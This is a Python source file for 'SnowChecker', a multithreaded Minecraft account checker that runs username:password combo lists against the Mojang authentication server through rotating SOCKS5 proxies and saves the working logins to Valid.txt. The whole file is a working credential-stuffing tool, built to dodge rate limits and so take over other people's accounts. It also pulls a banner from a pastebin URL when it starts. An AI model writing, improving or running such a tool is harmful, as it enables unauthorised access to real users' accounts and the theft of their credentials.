from colorama import Fore, init, Style
from requests import Session, exceptions
from traceback import format_exc
from easygui import fileopenbox

import threading, requests
import ctypes, time, os
import random

yellow = Fore.LIGHTYELLOW_EX
red = Fore.LIGHTRED_EX
green = Fore.LIGHTGREEN_EX
cyan = Fore.LIGHTCYAN_EX
blue = Fore.LIGHTBLUE_EX
white = Fore.LIGHTWHITE_EX
magenta = Fore.LIGHTMAGENTA_EX

version = "0.2"
mark = f'{white}\n' + requests.get("https://pastebin.com/raw/jHQh1YYm").text + f"\n\n{magenta}  SnowChecker-{version} »» by Starlysh & Devs Team \n"

class Main:
    def __init__(self):
        self.checking = True
        self.usernames = []
        self.passwords = []
        self.proxy_list = []
        self.invalid = 0
        self.counter = 0
        self.valid = 0

    def load_proxies(self):
        print(mark)
        if os.path.exists("proxies.txt"):
            try:
                with open("proxies.txt", 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace('\n', '')
                            self.proxy_list.append(proxyline)
                        except:
                            pass
                print(f"> Loaded [{len(self.proxy_list)}] proxies lines..\n")
            except Exception:
                print("proxy error")

    def load_combos(self):
        if os.path.exists("combo.txt"):
            with open("combo.txt", "r") as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        self.usernames.append(line.split(":")[0])
                        self.passwords.append(line.split(":")[-1])
            if not len(self.usernames): return None
            return True
        print(mark)
        os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
        print(f'{yellow}ERROR{white} : No combo file found: \'combo.txt\'');
        combo = loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8", errors='ignore').read().split('\n') 
        exit()
    
    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
       
    def session(self):
        session = requests.Session()
        session.trust_env = False
        return session
    
    def check_account(self, username, password):
        try:
            for uwu in range(self.retries):
                session = self.session()
                proxy = random.choice(self.proxy_list)
                json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
                check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = dict(
                    http="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080",
                    https="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"
                ))
                
                # print(check.json())

                if "accessToken" in check.json():
                    print(f'{green}[Good] {white}{username}:{password}')
                elif "error" in check.json():
                    print(f'{red}[Bad] {white}{username}:{password}')
                elif "The request could not be satisfied." in check.content:
                    print(f'{yellow}[Rate Limited] {white}{username}:{password}')
                    self.proxy_list.remove(proxy)
            
            if "clientToken" in check.text:
                with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
                self.valid += 1
                self.title()
            else:
                self.invalid += 1
                self.title()
        except Exception:
            pass

    def start_checking(self):
        def thread_starter():
            self.check_account(self.usernames[self.counter], self.passwords[self.counter])

        while True:
            if threading.active_count() <= self.threads:
                threading.Thread(target = thread_starter).start()
                self.counter += 1
            
            if self.counter >= len(self.usernames): break
        input()

    def main(self):
        os.system("cls")
        load_combo = self.load_combos()
        if load_combo is not None:
            print(mark)
            self.threads = int(input(f'{blue}> {white}Threads: '))
            os.system("cls")
            print(mark)
            self.retries = int(input(f'{blue}> {white}Retries (1 = default, 3 max): '))
            if self.retries == 0:
                self.retries = 1
            elif self.retries > 3 or self.retries < 1:
                retries_old = self.retries
                self.retries = 1
                print(f'{red}Unexpected value ({retries_old}, new value {self.retries}')
            os.system("cls")
            self.load_proxies()
            self.start_checking()
        else:
            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
            print(f'{yellow}ERROR{white} : Please put your combos inside of \'combo.txt\''); time.sleep(10); 
            exit()

Main().main()

if __name__ == '__main__':
    session = Session()    
    # if SnowChecker.version_check:
    #     checkforupdates()
Main()
